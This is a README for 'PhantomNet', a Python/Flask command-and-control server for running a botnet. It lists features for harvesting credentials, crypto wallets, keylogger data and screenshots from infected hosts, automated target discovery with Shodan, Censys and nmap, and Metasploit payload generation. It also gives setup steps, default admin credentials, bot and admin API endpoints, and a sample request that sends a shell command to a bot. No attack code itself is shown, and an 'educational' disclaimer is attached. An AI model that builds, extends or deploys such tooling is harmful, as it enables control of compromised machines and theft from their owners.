# PhantomNet C2 Server

A sophisticated Command and Control (C2) server built with Python and Flask, designed for advanced red team operations and botnet management.

## Features

- **Bot Management**: Register and control multiple bot clients
- **Target Discovery**: Automated target discovery using Shodan, Censys, and network scanning
- **Payload Generation**: Generate custom payloads using Metasploit Framework
- **Threat Intelligence**: Check target reputation across multiple intelligence sources
- **Advanced Operations**: Campaign management, exploit tracking, and task scheduling
- **Web Dashboard**: Modern web interface for monitoring and control
- **API Endpoints**: RESTful API for programmatic access
- **DuckDNS Integration**: Dynamic DNS updates for consistent connectivity
- **Data Collection**: Comprehensive data harvesting (system info, network scans, screenshots, keylogger data, credentials, crypto wallets)

## Project Structure

```
phantomnet-c2/
├── phantomnet/                    # Main package
│   ├── __init__.py               # Package initialization
│   ├── app.py                    # Flask application factory
│   ├── config.py                 # Configuration settings
│   ├── models.py                 # Database models
│   ├── server.py                 # Core server logic
│   ├── discovery.py              # Target discovery module
│   ├── payload_generator.py      # Payload generation module
│   ├── threat_intelligence.py    # Threat intelligence module
│   ├── routes/                   # Flask route handlers
│   │   ├── __init__.py
│   │   ├── admin.py             # Admin web interface routes
│   │   ├── bot.py               # Bot communication routes
│   │   └── api.py               # REST API routes
│   ├── static/                  # Static files (CSS, JS, images)
│   ├── templates/               # HTML templates
│   └── utils/                   # Utility functions
│       └── __init__.py
├── tests/                       # Unit and integration tests
├── requirements.txt             # Python dependencies
└── README.md                    # This file
```

## Installation

1. **Clone the repository:**
   ```bash
   git clone <repository-url>
   cd phantomnet-c2
   ```

2. **Create a virtual environment:**
   ```bash
   python -m venv venv
   source venv/bin/activate  # On Windows: venv\Scripts\activate
   ```

3. **Install dependencies:**
   ```bash
   pip install -r requirements.txt
   ```

4. **Configure environment variables (optional):**
   ```bash
   export FLASK_ENV=development
   export VIRUSTOTAL_API_KEY=your_key_here
   export SHODAN_API_KEY=your_key_here
   export CENSYS_API_ID=your_id_here
   export CENSYS_API_SECRET=your_secret_here
   export ABUSEIPDB_API_KEY=your_key_here
   export OTX_API_KEY=your_key_here
   ```

## Configuration

The application uses a configuration system that supports multiple environments. Key settings include:

- **Database**: SQLite by default, configurable for PostgreSQL/MySQL
- **Server**: Host, port, SSL settings
- **API Keys**: For threat intelligence and target discovery services
- **Security**: Session management, password policies
- **Logging**: File and console logging with configurable levels

See `phantomnet/config.py` for all available configuration options.

## Usage

### Starting the Server

**Development mode:**
```bash
python -m phantomnet.app
```

**Production mode:**
```bash
export FLASK_ENV=production
gunicorn -w 4 -b 0.0.0.0:8443 phantomnet.app:app
```

### Accessing the Web Interface

- **Admin Dashboard**: `https://localhost:8443/admin/login`
- **Default Credentials**: `admin` / `phantom_admin_2024`

### API Usage

The server provides RESTful API endpoints for programmatic access:

```python
import requests

# Send command to bot
response = requests.post('https://localhost:8443/admin/commands',
    json={
        'bot_id': 'bot_123',
        'command': 'execute',
        'args': {'cmd': 'whoami'}
    },
    headers={'Authorization': 'Bearer <token>'}
)

# Generate payload
response = requests.post('https://localhost:8443/admin/payloads',
    json={
        'name': 'test_payload',
        'platform': 'windows',
        'architecture': 'x64'
    }
)
```

## Key Components

### 1. Server Core (`server.py`)
- `PhantomC2Server`: Main server class handling bot management
- Session token management
- DuckDNS integration
- Campaign execution
- Background task management

### 2. Target Discovery (`discovery.py`)
- `TargetDiscovery`: Automated target discovery
- Shodan API integration
- Censys API integration
- Network scanning with nmap
- DNS enumeration

### 3. Payload Generation (`payload_generator.py`)
- `PayloadGenerator`: Generate custom payloads
- Metasploit Framework integration
- Multi-platform support (Windows, Linux, macOS)
- Multiple payload types (EXE, DLL, ELF, etc.)

### 4. Threat Intelligence (`threat_intelligence.py`)
- `ThreatIntelligence`: Target reputation checking
- VirusTotal integration
- AbuseIPDB integration
- AlienVault OTX integration
- Bulk reputation checking

### 5. Database Models (`models.py`)
- SQLAlchemy ORM models for all entities
- Bot management
- Command tracking
- Data collection (system info, network scans, etc.)
- Campaign and exploit management

## Security Considerations

**WARNING**: This is a research and educational tool. Use only in controlled environments with proper authorization.

- Use SSL/TLS in production
- Implement proper authentication and authorization
- Regularly update dependencies
- Monitor for security vulnerabilities
- Use strong, unique passwords
- Implement rate limiting and DDoS protection
- Regularly backup the database
- Log all activities for audit purposes

## API Reference

### Bot Endpoints
- `POST /bot/register` - Register new bot
- `GET /bot/command/<bot_id>` - Get pending commands
- `POST /bot/result/<command_id>` - Submit command results
- `POST /bot/data/*` - Submit collected data

### Admin Endpoints
- `GET /admin/dashboard` - Web dashboard
- `POST /admin/commands` - Send commands to bots
- `POST /admin/payloads` - Generate payloads
- `POST /admin/campaigns` - Create campaigns
- `POST /admin/targets/discover` - Discover targets

### API Endpoints
- `GET /admin/bots` - List all bots
- `GET /admin/tasks` - List tasks
- `GET /admin/exploits` - List exploits
- `GET /admin/stats` - Server statistics

## Development

### Running Tests
```bash
pytest tests/
```

### Code Quality
```bash
black phantomnet/
flake8 phantomnet/
mypy phantomnet/
```

### Database Migrations
```bash
flask db migrate
flask db upgrade
```

## Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests for new functionality
5. Submit a pull request

## License

This project is for educational and research purposes only. Use at your own risk.

## Disclaimer

This software is designed for security research and education. The authors are not responsible for any misuse or illegal activities conducted with this software.
